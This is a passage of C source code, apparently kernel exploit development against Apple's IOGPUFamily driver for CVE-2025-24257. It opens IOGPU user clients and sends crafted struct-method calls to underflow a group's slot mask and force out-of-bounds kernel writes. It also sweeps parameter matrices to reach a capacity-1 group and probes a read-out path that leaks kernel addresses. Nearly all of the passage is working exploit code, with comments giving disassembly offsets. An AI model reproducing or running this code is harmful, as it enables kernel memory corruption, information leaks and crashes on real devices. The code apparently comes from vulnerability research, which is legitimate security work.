                memcpy(&gh2, o6 + 0x10, 8);
                grp_dump_handle(gh2, "after-add1");
            }
            int a2 = call_sel(conn, CMD_ADD_RES, id, 1, 0, 0, o6, &on6);
            {
                uint64_t gh3 = 0;
                memcpy(&gh3, o6 + 0x10, 8);
                grp_dump_handle(gh3, "after-add2");
            }
            ol("[grp] geo[%u] id=%u add1=0x%x add2=0x%x%s", gi, id, a1, a2,
               (a2 == (int)0x10000003) ? "  *** CLIENT DIED - OOB WRITE LANDED ***" : "");
            if (a2 == (int)0x10000003) { ol("[grp] dead at geo[%u]", gi); break; }
            CFRelease(s);
        }
        ol("[grp] controlled OOB write sweep done");
    }


    if (trigger == 7) {
        /* KERNEL READ-OUT PROBE (cmd 0/128).
         *
         * The cmd 0/128 path in IOGPUFamily (0x9f60050) resolves an object
         * by id and then copies its data to a USER pointer:
         *   0x9f602f4: ldr  x1, [x20, #56]     ; the kernel object
         *   0x9f602f8: ldr  x2, [x19, #112]    ; the SIZE
         *   0x9f6031c: bl   0x8474018          ; the copy out
         * The destination is the user pointer from the struct, and the size
         * comes from the kernel.
         *
         * The handler refuses the call when bit 1 of the session state byte
         * is set (0x9f60098 ldrb w8,[x20,#64] / tbnz w8,#1) - and creating
         * a group sets that bit. So the read-out has to go out on a FRESH
         * connection, with the group created on another one.
         *
         * The args blob (struct[24], >= 16 bytes) is parsed by the helper
         * 0xa241cbc; the value it yields is compared against the object's
         * type field, so the layout of the blob is swept as well.
         */
        ol("[grp] === KERNEL READ-OUT PROBE (cmd 0/128, fresh session) ===");
        static uint8_t userbuf[0x8000];
        static uint8_t argsbuf[0x100];

        /* the group is created on its own connection */
        uint64_t grp7 = 0;
        {
            uint8_t o[0x200];
            size_t on = 0;
            int k = call_sel(conn, CMD_NEW_GROUP, 64, 0, 0, 0, o, &on);
            if (k == 0) memcpy(&grp7, o + 0x10, 8);
            ol("[grp] group on the other connection -> kr=0x%x grp=0x%016llx",
               k, (unsigned long long)grp7);
        }

        /* a FRESH connection for the read-out itself */
        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                        IOServiceMatching("IOGPU"));
        io_connect_t fresh = MACH_PORT_NULL;
        for (uint32_t t = 0; t <= 40 && !fresh; t++) {
            io_connect_t c = MACH_PORT_NULL;
            if (IOServiceOpen(svc, mach_task_self(), t, &c) == KERN_SUCCESS && c) fresh = c;
        }
        if (!fresh) { ol("[grp] no fresh connection"); return; }

        static const uint64_t cands[] = { 0, 1, 2, 3, 64, 128, 256, 512,
                                          0x1000, 0x10000, 0xffffffff };
        /* where in the args blob the id/type sits, and the value */
        static const uint32_t aoff[] = { 0, 8, 16 };
        int hits = 0;
        for (uint32_t ci = 0; ci < sizeof(cands)/sizeof(cands[0]); ci++) {
            for (uint32_t ai = 0; ai < sizeof(aoff)/sizeof(aoff[0]); ai++) {
                for (uint32_t f72 = 1; f72 <= 2; f72++) {
                    for (uint32_t usegrp = 0; usegrp <= 1; usegrp++) {
                        memset(userbuf, 0xAA, sizeof(userbuf));
                        memset(argsbuf, 0, sizeof(argsbuf));
                        uint64_t v = cands[ci];
                        memcpy(argsbuf + aoff[ai], &v, 8);
                        memcpy(argsbuf + 0, &v, 8);
                        memcpy(argsbuf + 8, &v, 8);
                        uintptr_t ap7 = (uintptr_t)argsbuf;
                        uintptr_t bp7 = (uintptr_t)userbuf;

                        uint8_t in7[STRUCT_SZ];
                        memset(in7, 0, sizeof(in7));
                        uint64_t c0 = 0;
                        memcpy(in7 + 0, &c0, 8);
                        memcpy(in7 + 24, &ap7, 8);
                        memcpy(in7 + 56, &bp7, 8);
                        uint64_t fv = f72;
                        memcpy(in7 + 72, &fv, 8);
                        uint64_t gv = usegrp ? grp7 : 0;
                        memcpy(in7 + 64, &gv, 8);

                        static uint8_t out7[0x400];
                        size_t on7 = sizeof(out7);
                        memset(out7, 0, on7);
                        kern_return_t kr = IOConnectCallStructMethod(fresh, IOGPU_SEL,
                                                                      in7, sizeof(in7),
                                                                      out7, &on7);
                        int touched = 0;
                        for (size_t o = 0; o < sizeof(userbuf); o++)
                            if (userbuf[o] != 0xAA) { touched = 1; break; }
                        if (kr != 0xe00002be || touched) {
                            ol("[grp] cand=0x%llx aoff=%u f72=%u grp=%u -> kr=0x%x touched=%d",
                               (unsigned long long)cands[ci], aoff[ai], f72, usegrp,
                               kr, touched);
                        }
                        if (touched) {
                            hits++;
                            size_t shown = 0;
                            for (size_t o = 0; o < sizeof(userbuf) && shown < 32; o += 8) {
                                uint64_t w = 0;
                                memcpy(&w, userbuf + o, 8);
                                if (w == 0xAAAAAAAAAAAAAAAAULL) continue;
                                shown++;
                                ol("[grp]   buf+0x%04zx = 0x%016llx%s", o,
                                   (unsigned long long)w,
                                   grp_is_kernel_va(w) ? "   <-- KERNEL ADDRESS" : "");
                            }
                        }
                    }
                }
            }
        }
        ol("[grp] read-out probe done, buffer hits=%d", hits);
        IOServiceClose(fresh);
    }

    if (trigger == 0 || trigger == 4) {
        /* DUPLICATE ADD = THE REMOVE PATH.
         *
         * The slot table's mask lives at +0x30 and is decremented on every
         * removal (0x9f51914 ldr w9,[x0,#48] / 0x9f51918 sub w9,w9,#1 /
         * 0x9f5191c str w9,[x0,#48]). A group with capacity 64 starts with
         * MASK = (64>>6)-1 = 0, so ONE removal turns the mask into
         * 0xffffffff and the next insert indexes the bitmap unmasked.
         *
         * No command removes a resource by its global id - the probe of all
         * 256 commands found none (remove candidate cmd=4294967295). But
         * adding the SAME resource twice forces the insert path to drop the
         * old entry first, and that drop is the removal.
         */
        ol("[grp] === DUPLICATE-ADD TRIGGER (mode=%d) ===", trigger);
        static uint8_t o4[0x200];
        size_t on4 = 0;
        int k4 = call_sel(conn, CMD_NEW_GROUP, 64, surf_id, 0, 0, o4, &on4);
        uint64_t grp4 = 0;
        if (k4 == 0) memcpy(&grp4, o4 + 0x10, 8);
        ol("[grp] group -> kr=0x%x grp=0x%016llx", k4, (unsigned long long)grp4);
        if (k4 != 0) { ol("[grp] no group"); return; }

        for (uint32_t i = 0; i < nsurf; i++) {
            ol("[grp] add #1 surf_id=%u", surf_ids[i]);
            int a1 = call_sel(conn, CMD_ADD_RES, surf_ids[i], 1, 0, 0, o4, &on4);
            ol("[grp] add #1 surf_id=%u -> kr=0x%x", surf_ids[i], a1);
            if (a1 != 0) break;

            ol("[grp] add #2 (same id - this drops the old entry) surf_id=%u", surf_ids[i]);
            int a2 = call_sel(conn, CMD_ADD_RES, surf_ids[i], 1, 0, 0, o4, &on4);
            ol("[grp] add #2 surf_id=%u -> kr=0x%x  (mask is now 0xffffffff)", surf_ids[i], a2);
            if (a2 == (int)0x10000003) {
                ol("[grp] client died on the duplicate add - the mask was already "
                   "underflowed and the bitmap access went out of bounds");
                break;
            }
            if (a2 != 0) { ol("[grp] duplicate refused (kr=0x%x) - this path is closed", a2); break; }

            ol("[grp] OOB add: fresh resources with the underflowed mask");
            for (uint32_t j = 0; j < nsurf; j++) {
                if (j == i) continue;
                ol("[grp] OOB add surf_id=%u", surf_ids[j]);
                int ke = call_sel(conn, CMD_ADD_RES, surf_ids[j], 1, 0, 0, o4, &on4);
                ol("[grp] OOB add surf_id=%u -> kr=0x%x", surf_ids[j], ke);
                if (ke == (int)0x10000003) {
                    ol("[grp] client died (INVALID_DEST) - the out-of-bounds "
                       "bitmap access already hit unmapped memory");
                    break;
                }
            }
            break;
        }
        ol("[grp] duplicate-add trigger done");
    }

    if (trigger == 1) {
        /* DIRECT GROW on a FRESH connection.
           0x10000003 = MACH_SEND_INVALID_DEST: the IOGPU user client dies
           when a group is destroyed (on 18.3 that was the kernel panic; on
           26.2 the client is torn down). So the connection must be fresh, and
           the grow test must run BEFORE anything else. */
        ol("[grp] DIRECT GROW on a fresh connection");

        /* two groups: cmd 3, capacity 64 (the only accepted capacity) */
        uint64_t grpA = 0, grpB = 0;
        static uint8_t out2[0x200];
        size_t on2 = 0;
        for (int g = 0; g < 2; g++) {
            int k2 = call_sel(conn, CMD_NEW_GROUP, 64, surf_id, 0, 0, out2, &on2);
            uint64_t p2 = 0;
            if (k2 == 0) memcpy(&p2, out2 + 0x10, 8);
            ol("[grp] group %d -> kr=0x%x ptr=0x%016llx", g, k2, (unsigned long long)p2);
            if (g == 0) grpA = p2; else grpB = p2;
        }
        if (!grpA) {
            ol("[grp] no group created (kr=0x%x) - cannot drive the growth path", 0x10000003);
        } else {
            /* the array element may be a GROUP (type byte == 3), so the handle
               in struct[56] can be a group pointer. Sweep: small indices,
               then both group pointers, then the pointer of the other group. */
            uint64_t keys[300];
            uint32_t nk = 0;
            for (uint32_t k = 0; k < 256; k++) keys[nk++] = k;
            keys[nk++] = grpA;
            keys[nk++] = grpB;
            if (surf_id) keys[nk++] = surf_id;      /* surface global id */
            keys[nk++] = (uint64_t)(uintptr_t)surf; /* surface ref pointer */
            for (uint32_t k = 0; k < nk; k++) {
                ol("[grp] GROW key[%u] = 0x%016llx", k, (unsigned long long)keys[k]);
                kr = call_sel(conn, CMD_ADD_RES, keys[k], 1, 0, 0, out, &on);
                ol("[grp] GROW key[%u] -> kr=0x%x", k, kr);
                if (kr == 0) {
                    /* The group accepted a resource. count went 0->1, the grow
                     * path recomputed capacity = 2*count = 2 and stored
                     * obj+0x28 = (2>>6)-1 = 0xffffffff. The bitmap itself is
                     * only (capacity+63)/8 = 8 bytes, so every later bucket
                     * index is out of bounds.
                     * Do NOT close yet: keep the connection so we can keep
                     * adding resources (each add grows the group again and
                     * moves the out-of-bounds bucket), and only close at the
                     * very end. */
                    ol("[grp] *** GROW key[%u] ACCEPTED (kr=0) - group count is now >=1, "
                       "mask should be 0xffffffff", k);
                    ol("[grp] adding more resources (each add re-grows the group)");
                    for (uint32_t extra = 0; extra < 8 && extra < nsurf; extra++) {
                        ol("[grp] EXTRA add surf_id=%u", surf_ids[extra]);
                        int ke = call_sel(conn, CMD_ADD_RES, surf_ids[extra], 1, 0, 0, out, &on);
                        ol("[grp] EXTRA add surf_id=%u -> kr=0x%x", surf_ids[extra], ke);
                        if (ke == (int)0x10000003) {
                            ol("[grp] client died on the extra add (INVALID_DEST) - "
                               "the out-of-bounds access already hit unmapped memory");
                            break;
                        }
                    }
                    ol("[grp] closing the connection (group destructor walks the bitmap "
                       "with the underflowed mask)");
                    IOServiceClose(conn);
                    ol("[grp] connection closed");
                    return;
                }
                if (kr == (int)0x10000003) {
                    ol("[grp] *** GROW key[%u] -> client died (0x10000003 INVALID_DEST) "
                       "- the group destructor already tripped", k);
                    return;
                }
            }
            ol("[grp] GROW: no key accepted");
        }

        /* PoC-exact sweep last: it destroys the client when a group is
           created and closed, so it must not run before the grow test. */
        ol("[grp] PoC-exact sweep (after grow test)");
        poc_exact_sweep(conn, use_type);
        ol("[grp] PoC-exact sweep done (calls=%u)", g_calls);
    }

    /* ---- step 1: create a RESOURCE.
       The group (type 3) creates fine, but every other type answers
       kIOReturnNoResources - a resource needs an IOSurface. The public
       24257 PoC creates one. We build a 1x0x1000 BGRA surface and then
       sweep: resource type x struct offset x how the surface is passed
       (global id / mach port name / ref pointer). Whatever returns
       success with a small integer is the resource handle cmd=130 wants
       in struct[56]. */
    uint64_t handle = 0;
    uint32_t res_type = 0;
    static const uint32_t off_list[] = { 8, 16, 24, 32, 40, 48, 56, 64, 72, 80 };
    for (uint32_t t = 1; t <= 16; t++) {
        if (t == 3) continue;                 /* 3 = group, handled in step 2 */
        for (uint32_t oi = 0; oi < sizeof(off_list)/sizeof(off_list[0]); oi++) {
            uint32_t off = off_list[oi];
            for (uint32_t form = 0; form < 4; form++) {
                uint64_t val = 0;
                switch (form) {
                    case 0: val = surf_id; break;                       /* global id */
                    case 1: val = (uint64_t)(uintptr_t)surf; break;      /* ref pointer */
                    case 2: val = surf_id; break;                       /* id + capacity */
                    case 3: val = (uint64_t)(uintptr_t)surf; break;      /* ptr + capacity */
                }
                kr = call_sel2(conn, t, off, val, (form >= 2) ? 64 : 0);
                if (kr == 0) {
                    ol("[grp] STEP 1 HIT type=%u off=0x%x form=%u val=0x%llx", t, off, form, (unsigned long long)val);
                    for (uint32_t w = 0; w + 8 <= 0x40; w += 8) {
                        uint64_t v = 0;
                        memcpy(&v, g_last_out + w, 8);
                        ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
                    }
                    handle = 0;
                    for (uint32_t w = 0; w + 8 <= 0x40; w += 8) {
                        uint64_t v = 0;
                        memcpy(&v, g_last_out + w, 8);
                        if (v && v < 0x10000) { handle = v; break; }
                    }
                    if (handle) { res_type = t; break; }
                }
            }
            if (handle) break;
        }
        if (handle) break;
    }
    ol("[grp] STEP 1 result: resource type=%u handle=0x%llx", res_type, (unsigned long long)handle);
    if (!handle) ol("[grp] STEP 1: no resource type/offset/form produced a handle");

    /* ---- step 2: new group (cmd 3) with capacity 64 ---- */
    ol("[grp] STEP 2 new_group cmd=3 cap=64");
    kr = call_sel(conn, CMD_NEW_GROUP, 64, 0, 0, 0, out, &on);
    ol("[grp] STEP 2 -> kr=0x%x outN=%zu", kr, on);
    uint64_t grp = 0;
    for (uint32_t w = 0; w + 8 <= 0x40 && w < on; w += 8) {
        uint64_t v = 0;
        memcpy(&v, out + w, 8);
        ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
    }
    memcpy(&grp, out + 0x10, 8);
    ol("[grp] STEP 2 group ptr = 0x%016llx", (unsigned long long)grp);

    /* ---- step 4 (read back the group BEFORE any add) ---- */
    if (grp) {
        uint8_t obj0[0x40];
        memset(obj0, 0, sizeof(obj0));
        int r0 = nk_do_kread(grp, obj0, sizeof(obj0));
        ol("[grp] PRE-ADD read -> %d", r0);
        if (r0 == 0) {
            uint32_t c0 = 0, m0 = 0;
            memcpy(&c0, obj0 + 0x20, 4);
            memcpy(&m0, obj0 + 0x28, 4);
            ol("[grp] PRE-ADD obj+0x20 count=%u  obj+0x28 MASK=0x%08x", c0, m0);
        }
    }

    if (!trigger) {
        ol("[grp] READ-ONLY done (use the TRIGGER button to drive the growth path)");
        IOServiceClose(conn);
        return;
    }

    /* ---- step 3: add the resource to the group -> growth path ---- */
    ol("[grp] TRIGGER: adding the resource to the group; this may panic the kernel");
    for (uint32_t h = 0; h < 12; h++) {
        uint64_t cand = (h == 0) ? handle : h;
        ol("[grp] STEP 3 add_resource cmd=130 handle=%llu", (unsigned long long)cand);
        kr = call_sel(conn, CMD_ADD_RES, cand, 1, 0, 0, out, &on);
        ol("[grp] STEP 3 -> kr=0x%x outN=%zu", kr, on);
        if (kr == 0) {
            for (uint32_t w = 0; w + 8 <= 0x40 && w < on; w += 8) {
                uint64_t v = 0;
                memcpy(&v, out + w, 8);
                ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
            }
            break;
        }
    }

    /* ---- step 4: read the group object back ---- */
    if (grp) {
        ol("[grp] STEP 4 read group object");
        uint8_t obj[0x80];
        memset(obj, 0, sizeof(obj));
        int r = nk_do_kread(grp, obj, sizeof(obj));
        ol("[grp] STEP 4 kread -> %d", r);
        if (r == 0) {
            uint32_t count = 0, mask = 0;
            memcpy(&count, obj + 0x20, 4);
            memcpy(&mask, obj + 0x28, 4);
            ol("[grp]   obj+0x20 count=%u", count);
            ol("[grp]   obj+0x28 MASK=0x%08x %s", mask,
               mask == 0xffffffffu ? "<<< UNDERFLOW LIVE" : "");
            for (uint32_t w = 0; w + 8 <= sizeof(obj); w += 8) {
                uint64_t v = 0;
                memcpy(&v, obj + w, 8);
                ol("[grp]   obj[+0x%02x]=0x%016llx", w, (unsigned long long)v);
            }
        }
    } else {
        ol("[grp] no group pointer, skipping readback");
    }
    IOServiceClose(conn);
    ol("[grp] === done ===");
}

/* ------------------------------------------------------------------ */
/* CAPACITY MATRIX - which field is the real capacity, and what gates it  */
/*                                                                        */
/* Static facts (23C55 IOGPUFamily):                                     */
/*   group-info init 0x9f61200:  +0x20 = capacity, +0x28 = MASK          */
/*                             (capacity>>6)-1, +0x2c = log2(capacity)   */
/*   the bitmap word index is masked with MASK, and the element index is  */
/*   bucket*64 + bit, where bucket = hash >> (64 - log2(capacity)).        */
/*   For capacity == 1, log2 == 0 => the shift by 64 degenerates and the  */
/*   bucket becomes the whole 64-bit hash => the element array write     */
/*   lands up to 16 GB past a 4-byte kalloc, and the bitmap word RMW     */
/*   lands up to 512 MB past the bitmap. That is the CVE-2025-24257      */
/*   primitive. It needs capacity == 1 (any capacity with log2 > 0 keeps  */
/*   the bucket inside the allocation).                                  */
/*   init has exactly two callers: CREATE 0x9f60fcc and GROW 0x9f64910.  */
/*   GROW re-inits with the SAME capacity (mov x1,x21 = x0->+0x20).       */
/*   CREATE is reached with a HARDCODED capacity of 64 (0x9f614ac        */
/*   mov w2,#64) - so the `cmp w2,#63` gate there is vacuous for us.      */
/*   In the 2D path the capacity is ROUNDED UP: (cap+dim-1) & -dim       */
/*   (0x9f4d328), so cap=1 would become 16384 there.                      */
/*                                                                        */
/* BASELINE (known good on 23C55): cmd=3, f56=64, f60=0, f64=0, f72=0,    */
/* f80=1, in[24]=args ptr, every other byte zero. This matrix changes     */
/* exactly ONE field per case, on a fresh connection.                     */
/* ------------------------------------------------------------------ */
#define CM_LOG(fmt, ...) nk_doc_log("cap_matrix.log", fmt, ##__VA_ARGS__)

typedef struct {
    uint64_t f56, f60, f64, f72, f80;
} cm_args_t;

static int cm_one(const char *tag, cm_args_t a)
{
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                    IOServiceMatching("IOGPU"));
    if (!svc) { CM_LOG("[cm] no IOGPU service"); return -1; }
    io_connect_t conn = MACH_PORT_NULL;
    for (uint32_t t = 0; t <= 40 && !conn; t++) {
        io_connect_t c = MACH_PORT_NULL;
        if (IOServiceOpen(svc, mach_task_self(), t, &c) == KERN_SUCCESS && c) {
            conn = c;
        }
    }
    if (!conn) { CM_LOG("[cm] no usable type"); return -1; }

    static uint8_t in[STRUCT_SZ];
    memset(in, 0, sizeof(in));
    uint64_t c = CMD_NEW_GROUP;
    memcpy(in + 0, &c, 8);
    memcpy(in + 56, &a.f56, 8);
    memcpy(in + 60, &a.f60, 8);
    memcpy(in + 64, &a.f64, 8);
    memcpy(in + 72, &a.f72, 8);
    memcpy(in + 80, &a.f80, 8);
    uintptr_t ap = (uintptr_t)g_args;
    memcpy(in + 24, &ap, 8);

    static uint8_t out[0x200];
    size_t on = sizeof(out);
    memset(out, 0, on);
    kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, sizeof(in), out, &on);
    uint64_t h = 0;
    memcpy(&h, out + 0x10, 8);
    CM_LOG("[cm] %s f56=%llu f60=%llu f64=%llu f72=%llu f80=%llu -> kr=0x%x grp=0x%llx %s",
           tag, (unsigned long long)a.f56, (unsigned long long)a.f60,
           (unsigned long long)a.f64, (unsigned long long)a.f72,
           (unsigned long long)a.f80, kr, (unsigned long long)h,
           (kr == 0) ? "*** ACCEPTED ***" : "");
    IOServiceClose(conn);
    return (int)kr;
}

static void cm_sweep(const char *tag, int which, const uint64_t *vals, size_t n)
{
    static const uint64_t base56 = 64, base60 = 0, base64 = 0, base72 = 0, base80 = 1;
    for (size_t i = 0; i < n; i++) {
        cm_args_t a = { base56, base60, base64, base72, base80 };
        switch (which) {
            case 0: a.f56 = vals[i]; break;
            case 1: a.f60 = vals[i]; break;
            case 2: a.f64 = vals[i]; break;
            case 3: a.f72 = vals[i]; break;
            case 4: a.f80 = vals[i]; break;
            default: break;
        }
        cm_one(tag, a);
    }
}


/* cmd=64 ("add a dimension to the group"): struct[56] = the capacity of the
 * new dimension, struct[80] = the dimension size. The capacity is rounded
 * UP to a multiple of the dimension: total = (cap + dim - 1) & -dim
 * (0x9f4d328). If the dimension passes the "multiple of the limit" gate
 * (tst (limit-1), dim) while being SMALL, the capacity survives the
 * rounding - and capacity == 1 means log2(capacity) == 0, which degenerates
 * the bucket shift in the insert path (0x9f62c04 lsr x9, x20, x9) into a
 * shift by 0, i.e. the bucket becomes the full 64-bit hash and the bitmap
 * access leaves the allocation. That is the CVE-2025-24257 primitive.
 *
 * The group info pointer lives in the session ([x22+80]), so this has to
 * run on the SAME connection that created the group. */
static int cm_dim(const char *tag, uint64_t cap, uint64_t dim, uint64_t f64,
                  uint64_t f72)
{
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                    IOServiceMatching("IOGPU"));
    if (!svc) { CM_LOG("[cm] no IOGPU service"); return -1; }
    io_connect_t conn = MACH_PORT_NULL;
    for (uint32_t t = 0; t <= 40 && !conn; t++) {
        io_connect_t c = MACH_PORT_NULL;
        if (IOServiceOpen(svc, mach_task_self(), t, &c) == KERN_SUCCESS && c) {
            conn = c;
        }
    }
    if (!conn) { CM_LOG("[cm] no usable type"); return -1; }

    /* step 1: create the group (cmd=3, resource type 64) */
    static uint8_t in[STRUCT_SZ];
    memset(in, 0, sizeof(in));
    uint64_t c3 = CMD_NEW_GROUP;
    memcpy(in + 0, &c3, 8);
    uint64_t type64 = 64;
    memcpy(in + 56, &type64, 8);
    uint64_t one = 1;
    memcpy(in + 80, &one, 8);
    uintptr_t ap = (uintptr_t)g_args;
    memcpy(in + 24, &ap, 8);
    static uint8_t out[0x200];
    size_t on = sizeof(out);
    memset(out, 0, on);
    kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, sizeof(in), out, &on);
    uint64_t grp = 0;
    memcpy(&grp, out + 0x10, 8);
    CM_LOG("[cm] %s step1 create(type=64) -> kr=0x%x grp=0x%llx", tag, kr,
           (unsigned long long)grp);
    if (kr != 0) { IOServiceClose(conn); return (int)kr; }

    /* step 2: cmd=64 with the candidate capacity/dimension */
    memset(in, 0, sizeof(in));
    uint64_t c64 = 64;
    memcpy(in + 0, &c64, 8);
    memcpy(in + 56, &cap, 8);
    memcpy(in + 64, &f64, 8);
    memcpy(in + 72, &f72, 8);
    memcpy(in + 80, &dim, 8);
    memcpy(in + 24, &ap, 8);
    on = sizeof(out);
    memset(out, 0, on);
    kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, sizeof(in), out, &on);
    CM_LOG("[cm] %s step2 cmd64 cap=%llu dim=%llu f64=%llu f72=%llu -> kr=0x%x %s",
           tag, (unsigned long long)cap, (unsigned long long)dim,
           (unsigned long long)f64, (unsigned long long)f72, kr,
           (kr == 0) ? "*** ACCEPTED ***" : "");
    IOServiceClose(conn);
    return (int)kr;
}


/* cmd=64 WITHOUT a prior cmd=3.
 *
 * The previous matrix run always created a group first (cmd=3) and then
 * sent cmd=64 on the same session. But the handler checks a bit in the
 * SESSION state before doing anything:
 *   0x9f61350: ldrb w8, [x20, #64]
 *   0x9f61354: tbnz w8, #1 -> fail
 * Creating a group sets that bit, so every cmd=64 in the old matrix
 * arrived at a session that had already refused it. The "cmd=64 is dead"
 * conclusion was a test artifact, not a property of the build.
 *
 * This version sends cmd=64 FIRST on a fresh connection, then optionally
 * retries after a cmd=3 so the two orders can be compared.
 */
static int cm_dim_fresh(const char *tag, uint64_t cap, uint64_t dim,
                        uint64_t f64, uint64_t f72, int do_create_first)
{
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                    IOServiceMatching("IOGPU"));
    if (!svc) { CM_LOG("[cm] no IOGPU service"); return -1; }
    io_connect_t conn = MACH_PORT_NULL;
    for (uint32_t t = 0; t <= 40 && !conn; t++) {
        io_connect_t c = MACH_PORT_NULL;
        if (IOServiceOpen(svc, mach_task_self(), t, &c) == KERN_SUCCESS && c) conn = c;
    }
    if (!conn) { CM_LOG("[cm] no usable type"); return -1; }

    static uint8_t in[STRUCT_SZ];
    static uint8_t out[0x200];
    uintptr_t ap = (uintptr_t)g_args;

    if (do_create_first) {
        memset(in, 0, sizeof(in));
        uint64_t c3 = CMD_NEW_GROUP;
        memcpy(in + 0, &c3, 8);
        uint64_t t64 = 64;
        memcpy(in + 56, &t64, 8);
        uint64_t one = 1;
        memcpy(in + 80, &one, 8);
        memcpy(in + 24, &ap, 8);
        size_t on = sizeof(out);
        memset(out, 0, on);
        kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, sizeof(in), out, &on);
        CM_LOG("[cm] %s pre-create cmd3 -> kr=0x%x", tag, kr);
    }

    memset(in, 0, sizeof(in));
    uint64_t c64 = 64;
    memcpy(in + 0, &c64, 8);
    memcpy(in + 56, &cap, 8);
    memcpy(in + 64, &f64, 8);
    memcpy(in + 72, &f72, 8);
    memcpy(in + 80, &dim, 8);
    memcpy(in + 24, &ap, 8);
    size_t on = sizeof(out);
    memset(out, 0, on);
    kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, sizeof(in), out, &on);
    uint64_t h = 0;
    memcpy(&h, out + 0x10, 8);
    CM_LOG("[cm] %s cmd64 FRESH cap=%llu dim=%llu f64=%llu f72=%llu -> kr=0x%x grp=0x%llx %s",
           tag, (unsigned long long)cap, (unsigned long long)dim,
           (unsigned long long)f64, (unsigned long long)f72, kr,
           (unsigned long long)h, (kr == 0) ? "*** ACCEPTED ***" : "");
    if (kr == 0) {
        for (uint32_t w = 0; w + 8 <= 0x40; w += 8) {
            uint64_t v = 0;
            memcpy(&v, out + w, 8);
            CM_LOG("[cm]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
        }
    }
    IOServiceClose(conn);
    return (int)kr;
}

void nk_iogpu_capacity_matrix(void)
{
    nk_doc_log_open("cap_matrix.log");
    CM_LOG("[cm] === capacity matrix (23C55) baseline f56=64 f60=0 f64=0 f72=0 f80=1 ===");

    /* phase A: the capacity field itself - the money phase */
    static const uint64_t caps[] = { 1,2,3,4,5,6,7,8,16,32,63,64,65,96,127,128,
                                     192,255,256,1000,1024,4096,65536,262144 };
    CM_LOG("[cm] --- A: f56 (capacity) sweep ---");
    cm_sweep("A", 0, caps, sizeof(caps)/sizeof(caps[0]));

    /* phase B: the 4th u32 of the capacity word */
    static const uint64_t v60[] = { 0,1,2,3,64,0xffffffff };
    CM_LOG("[cm] --- B: f60 sweep ---");
    cm_sweep("B", 1, v60, sizeof(v60)/sizeof(v60[0]));

    /* phase C: f64 (the 2D / second-dimension field) */
    static const uint64_t v64[] = { 0,1,2,3,64,4096,16384,65536,262144 };
    CM_LOG("[cm] --- C: f64 sweep ---");
    cm_sweep("C", 2, v64, sizeof(v64)/sizeof(v64[0]));

    /* phase D: f72 */
    static const uint64_t v72[] = { 0,1,2,3,64,4096,16384,65536 };
    CM_LOG("[cm] --- D: f72 sweep ---");
    cm_sweep("D", 3, v72, sizeof(v72)/sizeof(v72[0]));

    /* phase E: f80 */
    static const uint64_t v80[] = { 0,1,2,3,32,64,128,4096,16384,65536,262144 };
    CM_LOG("[cm] --- E: f80 sweep ---");
    cm_sweep("E", 4, v80, sizeof(v80)/sizeof(v80[0]));

    /* phase F: small capacity with the 2D dimension set (the rounding path) */
    CM_LOG("[cm] --- F: f56 sweep with f80=16384 ---");
    {
        static const uint64_t d[] = { 1,2,4,8,16,32,64,16384 };
        for (size_t i = 0; i < sizeof(d)/sizeof(d[0]); i++) {
            cm_args_t a = { d[i], 0, 0, 0, 16384 };
            cm_one("F", a);
        }
    }

    /* phase G: small capacity with f64 set (the 2D flag path) */
    CM_LOG("[cm] --- G: f56 sweep with f64=16384 ---");
    {
        static const uint64_t d[] = { 1,2,4,8,16,32,64,16384 };
        for (size_t i = 0; i < sizeof(d)/sizeof(d[0]); i++) {
            cm_args_t a = { d[i], 0, 16384, 0, 1 };
            cm_one("G", a);
        }
    }

    /* phase H: cmd=64 - the dimension path. cap=1 with a small dim is the
       only way left to get capacity == 1 past the rounding. */
    CM_LOG("[cm] --- H: cmd=64 dimension path ---");
    {
        static const uint64_t dims[] = { 1,2,4,8,16,32,64,128,4096,16384 };
        for (size_t i = 0; i < sizeof(dims)/sizeof(dims[0]); i++)
            cm_dim("H", 1, dims[i], 0, 0);
    }

    /* phase I: cmd=64 with cap=1 and dim=1, varying the neighbours */
    CM_LOG("[cm] --- I: cmd=64 cap=1 dim=1, f64/f72 sweep ---");
    {
        static const uint64_t vals[] = { 0,1,2,64,16384 };
        for (size_t i = 0; i < sizeof(vals)/sizeof(vals[0]); i++)
            cm_dim("I", 1, 1, vals[i], 0);
        for (size_t i = 0; i < sizeof(vals)/sizeof(vals[0]); i++)
            cm_dim("I", 1, 1, 0, vals[i]);
    }

    /* phase J: cmd=64, dim=1, capacity sweep */
    CM_LOG("[cm] --- J: cmd=64 dim=1, capacity sweep ---");
    {
        static const uint64_t caps2[] = { 1,2,4,8,16,32,64,128,256 };
        for (size_t i = 0; i < sizeof(caps2)/sizeof(caps2[0]); i++)
            cm_dim("J", caps2[i], 1, 0, 0);
    }

    /* phase K: cmd=64 on a FRESH session (no prior cmd=3) */
    CM_LOG("[cm] --- K: cmd=64 on a fresh session ---");
    {
        static const uint64_t dims[] = { 1,2,4,8,16,32,64,128,256,512,4096,16384,65536 };
        for (size_t i = 0; i < sizeof(dims)/sizeof(dims[0]); i++)
            cm_dim_fresh("K", 1, dims[i], 0, 0, 0);
    }

    /* phase L: cmd=64 fresh, capacity sweep with dim=1 */
    CM_LOG("[cm] --- L: cmd=64 fresh, dim=1, capacity sweep ---");
    {
        static const uint64_t caps3[] = { 1,2,3,4,8,16,32,63,64,128,256 };
        for (size_t i = 0; i < sizeof(caps3)/sizeof(caps3[0]); i++)
            cm_dim_fresh("L", caps3[i], 1, 0, 0, 0);
    }

    /* phase M: cmd=64 fresh, dim=1, cap=1, neighbours varied */
    CM_LOG("[cm] --- M: cmd=64 fresh, cap=1 dim=1, f64/f72 sweep ---");
    {
        static const uint64_t vals[] = { 0,1,2,3,64,4096,16384 };
